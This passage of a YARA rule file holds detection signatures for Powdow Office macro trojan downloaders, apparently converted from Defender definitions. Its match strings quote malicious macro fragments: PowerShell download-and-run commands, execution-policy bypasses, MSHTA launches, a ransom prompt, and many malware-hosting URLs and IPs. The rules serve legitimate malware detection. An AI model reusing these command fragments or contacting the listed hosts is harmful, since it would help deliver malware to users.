        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.FP!MTB"
        threat_id = "2147752341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "tmp = Environ(\"TEMP\") & \"\\init.exe\"" ascii //weight: 1
        $x_1_2 = "Result = wm.Create(str, Null, wma, processid)" ascii //weight: 1
        $x_1_3 = {6f 62 6a 48 54 54 50 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 6d 6f 76 69 65 64 76 64 70 6f 77 65 72 2e 63 6f 6d 2f 43 56 5f 53 45 4f 5f 41 44 53 5f 44 61 76 69 64 5f 41 6c 76 61 72 65 7a 2e 74 78 74 22 2c 20 46 61 6c 73 65 02 00 6f 62 6a 48 54 54 50 2e 73 65 6e 64 20 28 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {72 65 73 20 3d 20 6a 2e 43 6f 70 79 46 69 6c 65 28 73 74 72 2c 20 74 6d 70 29 02 00 53 65 74 20 77 6d 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 58 6f 72 43 28 22 78 78 78 47 59}  //weight: 1, accuracy: Low
        $x_1_5 = {43 61 6c 6c 20 43 61 6c 6c 50 02 00 43 61 6c 6c 20 53 65 74 43 6f 6e 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT" ascii //weight: 1
        $x_1_2 = "+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://cutt.ly/8jmDPVb" ascii //weight: 1
        $x_1_4 = "move-Item -Path" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(nEw-oB`jecT" ascii //weight: 1
        $x_1_2 = "'+'loadFile')" ascii //weight: 1
        $x_1_3 = "ttps://cutt.ly/fjYtydH" ascii //weight: 1
        $x_1_4 = "mlkjljkjlkrglkjgrfjkljgf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(x, \"bbnnedetcy\", \"\")" ascii //weight: 1
        $x_1_2 = "= ActiveCell.Offset(iC, 1).Value" ascii //weight: 1
        $x_1_3 = "Call yGGsvaB.pkutdFZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (M_S + TOGACDT + M_S1 + M_S2 + M_S3), 0" ascii //weight: 1
        $x_1_2 = "URLDownloadToFile 0, ImagemSimplesCDT, MasterCDT & \"document.vbs\", 0, 0" ascii //weight: 1
        $x_1_3 = "TOGACDT = PDf_2 + PDf_3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hzunLrU.Run IpRAhYeJ + nYJEZJtb + yKijjyI, RValue" ascii //weight: 1
        $x_1_2 = "= ActiveDocument.BuiltInDocumentProperties(\"Comments\")" ascii //weight: 1
        $x_1_3 = "Set hzunLrU = CreateObject(\"Wscript.Shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"C:\\\\Windows\\\\System32\\\\cmd.exe /c echo" ascii //weight: 1
        $x_1_2 = "(wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.ps1" ascii //weight: 1
        $x_1_3 = "powershell -ExecutionPolicy ByPass -File b.ps1" ascii //weight: 1
        $x_1_4 = "START /MIN a.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "%37%A6%E2%F6%47%96%47%F2%13%13%13%E2%83%53%13%E2%73%23%23%E2%23%93%13%F2%F2%A3%07%47%47%86%72%72%82%56%72%B2%72%C6%96%72%B2%72%64%72%B2%72%46%72%B2%72%16%F6%" ascii //weight: 1
        $x_1_2 = "tilpS.srahCiics" ascii //weight: 1
        $x_1_3 = "$ neddih elytSwo" ascii //weight: 1
        $x_1_4 = "=srahCiicsa" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe  -ExecutionPolicy Bypass -NoProfile -WindowStyle hidden" ascii //weight: 1
        $x_1_2 = "Encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAe" ascii //weight: 1
        $x_1_3 = "= MsgBox(\"WE HAVE ALL YOUR DATA- YOU WANT PAY?-0.2bitcoin-78fcWL7M8A7woRBdnPurezEsW1o63RVYUS\", vbYesNo)" ascii //weight: 1
        $x_1_4 = "Call Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"https://long.af/FactDownParty\"" ascii //weight: 1
        $x_1_2 = {3d 20 53 68 65 6c 6c 28 [0-20] 28 22 36 33 36 64 36 34 32 30 32 66 36 33 32 30 35 30 34 66 35 37 34 35 35 32 35 33 34 38 34 35 34 63 34 63 32 65 36 35 37 38 36 35 22 29 20 26 20 [0-20] 28 22 32 30 32 64 37 37 32 30 36 38 36 39 36 34 36 34 36 35 36 65 32 30 32 64 34 35 37 38 36 35 36 33 37 35 37 34 36 39 36 66 36 65 35 30 36 66 36 63 36 39 36 33 37 39 32 30 34 32 37 39 37 30 36 31 37 33 37 33 32 30 22 29 20 26 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = "%HOMEDRIVE%\\%HOMEPATH%\\Documents\\easrtagyhdjkdgatareraty.ps1\"\"\", 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BK_2147752344_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BK!MTB"
        threat_id = "2147752344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "strCombined = str1 & str2 & str3 & str4 & str5 & str6 & str7" ascii //weight: 1
        $x_1_2 = "strCommand = \"powershell.exe -noexit -encodedcommand \" & strCombined" ascii //weight: 1
        $x_1_3 = "Set WsShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "WsShell.Run (strCommand)" ascii //weight: 1
        $x_1_5 = "str1 = \"LgAgACgAKABnAGUAdAAtAFYAQQBSAGkAQQBCA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EN_2147752403_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EN!MTB"
        threat_id = "2147752403"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f 7a 6f 6e 69 63 73 65 6c 6c 65 72 2e 63 6f 6d 2f [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = "C:\\WpvEsYh\\iglJQXB\\ONdhjbB.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EO_2147752746_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EO!MTB"
        threat_id = "2147752746"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://addledsteamb.xyz/BAYgODA0NUQ2OEY1RTA2ODg4RDhCQzlEQzRBRUU3QTA5OUI=" ascii //weight: 1
        $x_1_2 = "C:\\TQKcZwS\\qwsFIWr\\tDNIlBT.dll" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EP_2147752799_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EP!MTB"
        threat_id = "2147752799"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://rebrand.ly/wiy5cm0" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EQ_2147752800_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EQ!MTB"
        threat_id = "2147752800"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://urefere.org/opxe.exe" ascii //weight: 1
        $x_1_2 = "C:\\IFyROlH\\flhtwLg\\irCwapI.ex" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ER_2147752841_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ER!MTB"
        threat_id = "2147752841"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://istitutobpascalweb.it/mynotescom/renoovohostinglilnuxadvanced.php" ascii //weight: 1
        $x_1_2 = "C:\\RPJbYuR\\pvrDGVq\\rCLGjyS.ex" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ES_2147752845_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ES!MTB"
        threat_id = "2147752845"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe" ascii //weight: 1
        $x_1_2 = "C:\\jhbtqNj\\IOKVYnJ\\KUdYCRk.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ET_2147752849_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ET!MTB"
        threat_id = "2147752849"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "http://lialer.com/wFBIQQUccZOdYQKJvhxm/ejrwqokckt.exe" ascii //weight: 1
        $x_1_2 = "https://hillsbed.xyz/BAYgODA0NUQ2OEY1RTA2ODg4RDhCQzlEQzRBRUU3QTA5OUI=" ascii //weight: 1
        $x_1_3 = "http://contentedmerc.xyz/BAYgODA0NUQ2OEY1RTA2ODg4RDhCQzlEQzRBRUU3QTA5OUI=" ascii //weight: 1
        $x_1_4 = {68 74 74 70 3a 2f 2f 6d 61 72 63 68 32 36 32 30 32 30 2e 63 6f 6d 2f 66 69 6c 65 73 2f [0-8] 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_5 = {68 74 74 70 3a 2f 2f 74 75 6d 69 63 79 2e 63 6f 6d 2f 70 6c 71 69 6a 63 6e 64 77 6f 69 73 64 68 73 61 6f 77 2f [0-8] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_6 = {68 74 74 70 3a 2f 2f 77 6d 77 69 66 62 61 6a 78 78 62 63 78 6d 75 63 78 6d 6c 63 2e 63 6f 6d 2f 66 69 6c 65 73 2f [0-8] 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_7 = {68 74 74 70 3a 2f 2f 67 76 65 65 6a 6c 73 66 66 78 6d 66 6a 6c 73 77 6a 6d 66 6d 2e 63 6f 6d 2f 66 69 6c 65 73 2f [0-8] 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_8 = "https://www.slgroupsrl.com/vendorupdate/instreetwork.php" ascii //weight: 1
        $x_1_9 = {68 74 74 70 3a 2f 2f 73 65 72 76 69 63 65 2e 70 61 6e 64 74 65 6c 65 63 74 72 69 63 2e 63 6f 6d 2f [0-9] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_10 = {68 74 74 70 3a 2f 2f 75 70 72 65 76 6f 79 2e 63 6f 6d 2f [0-4] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_11 = {68 74 74 70 3a 2f 2f 6c 69 6e 65 2e 6c 61 72 67 65 66 61 6d 69 6c 69 65 73 6f 6e 70 75 72 70 6f 73 65 2e 63 6f 6d 2f [0-9] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_12 = "https://addledsteamb.xyz/BAYgODA0NUQ2OEY1RTA2ODg4RDhCQzlEQzRBRUU3QTA5OUI=" ascii //weight: 1
        $x_1_13 = "http://nevefe.com/wp-content/themes/calliope/wp-front.php" ascii //weight: 1
        $x_1_14 = {68 74 74 70 3a 2f 2f 67 73 74 61 74 2e 62 6c 75 65 63 68 69 70 73 74 61 66 66 69 6e 67 2e 63 6f 6d 2f [0-8] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_15 = {68 74 74 70 3a 2f 2f 67 73 74 61 74 2e 68 61 6d 69 6c 74 6f 6e 63 75 73 74 6f 6d 68 6f 6d 65 73 69 6e 63 2e 63 6f 6d 2f [0-8] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_16 = {68 74 74 70 3a 2f 2f 64 6f 6b 75 6d 65 6e 74 2d 39 38 32 37 33 32 33 37 32 34 34 32 33 38 32 33 2e 72 75 2f [0-37] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_17 = {68 74 74 70 3a 2f 2f 71 75 69 63 6b 75 70 6c 6f 61 64 65 72 2e 78 79 7a 2f 4b 61 6c 6b 6b 75 6c 65 72 6e 65 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_18 = "https://berlitzalahsa.sa/sport/rockstar.php" ascii //weight: 1
        $x_1_19 = "https://chinatyres.net/IuNbOpen/oiUnbYATR.php" ascii //weight: 1
        $x_1_20 = "https://dichthuatsnu.com/goodweb/pwofiles.php" ascii //weight: 1
        $x_1_21 = "https://piedmontrescue.org/sport/rockstar.php" ascii //weight: 1
        $x_1_22 = "http://esiglass.it/glassclass/glass.php" ascii //weight: 1
        $x_1_23 = "https://toulousa.com/omg/rockspa.php" ascii //weight: 1
        $x_1_24 = "https://staging2.lifebiotic.com/novacms/grassandrocks.php" ascii //weight: 1
        $x_1_25 = {68 74 74 70 3a 2f 2f 67 73 74 61 74 2e 64 6f 6e 64 79 61 62 6c 6f 2e 63 6f 6d 2f [0-9] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_26 = {68 74 74 70 3a 2f 2f 67 73 74 61 74 2e 63 6f 75 74 75 72 65 66 6c 6f 6f 72 2e 63 6f 6d 2f [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_27 = {68 74 74 70 3a 2f 2f 67 73 74 61 74 2e 63 68 72 6f 6d 61 69 6d 61 67 65 6e 2e 63 6f 6d 2f [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_28 = {68 74 74 70 3a 2f 2f 67 73 74 61 74 2e 73 65 63 75 72 69 74 69 65 73 73 75 70 70 6f 72 74 75 6e 69 74 2e 63 6f 6d 2f [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_29 = "https://stampdiato.at/BAYgODA0NUQ2OEY1RTA2ODg4RDhCQzlEQzRBRUU3QTA5OUI=" ascii //weight: 1
        $x_1_30 = "http://gstat.globaltcms.com/autorizz0.exe" ascii //weight: 1
        $x_1_31 = "http://gstat.echowin.com/autorizz0.exe" ascii //weight: 1
        $x_1_32 = "http://gstat.ddoborguild.com/0n1ine.exe" ascii //weight: 1
        $x_1_33 = "http://gstat.securityguardlisting.com/setup.exe" ascii //weight: 1
        $x_1_34 = "https://alwaslapps.com/attachment/attach.php" ascii //weight: 1
        $x_1_35 = "http://post.medusaranch.com/abonento9.exe" ascii //weight: 1
        $x_1_36 = "http://clarityupstate.com/b.ocx" ascii //weight: 1
        $x_1_37 = "http://205.185.122.246/khkwZF" ascii //weight: 1
        $x_1_38 = "http://plaintexw.com/xx.dll" ascii //weight: 1
        $x_1_39 = "https://bankss-71.ml/2.dll" ascii //weight: 1
        $x_1_40 = "http://217.8.117.60/arty.exe" ascii //weight: 1
        $x_1_41 = "http://toliku.com/qmzo.exe" ascii //weight: 1
        $x_1_42 = "http://qiiqur.com/frix.exe" ascii //weight: 1
        $x_1_43 = "http://zigyyt.com/trix.exe" ascii //weight: 1
        $x_1_44 = "http://mail.autoshops.online/gbh.exe" ascii //weight: 1
        $x_1_45 = "http://www.sync15.com/bizpolx.exe" ascii //weight: 1
        $x_1_46 = "http://205.185.122.246/files/may13.bin" ascii //weight: 1
        $x_1_47 = "http://205.185.122.246/FQL66n" ascii //weight: 1
        $x_1_48 = "http://205.185.122.246/jMLqH8" ascii //weight: 1
        $x_1_49 = "https://eetownvulgar.xyz/3/ssf.dll" ascii //weight: 1
        $x_1_50 = "http://209.141.54.161/files/crypt.dll" ascii //weight: 1
        $x_1_51 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "mlkjljkjlkrglkjgrfjkljgfrv" ascii //weight: 2
        $x_2_2 = "http://tinyurl.com/y3ox6t9t" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "MSHTA https://jornaldacidade.store/" ascii //weight: 2
        $x_1_2 = "Shell" ascii //weight: 1
        $x_1_3 = "Sub Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttps://tinyurl.com/y76d4wag" ascii //weight: 1
        $x_1_2 = "+'loadFile')" ascii //weight: 1
        $x_1_3 = "(nEw-oB`jecT Net.WebcL`IENt)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+'loadFile')" ascii //weight: 1
        $x_1_2 = "ttps://tinyurl.com/yapf7lfr" ascii //weight: 1
        $x_1_3 = "-Destination \"${enV`:appdata}" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/c po^wersh" ascii //weight: 1
        $x_1_2 = "(nEw-oB`jecT Ne" ascii //weight: 1
        $x_1_3 = "ttp://hotelcontinental-khenifra.com/admin/gyt091236.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"tps://www.diamantesviagens.com.br/terca." ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 28 [0-5] 4d 5f 53 4f 69 4d 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"hta\"" ascii //weight: 1
        $x_1_4 = "= \"hta\"\" ht\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "po^wersh" ascii //weight: 1
        $x_1_2 = "(nEw-oB`jecT" ascii //weight: 1
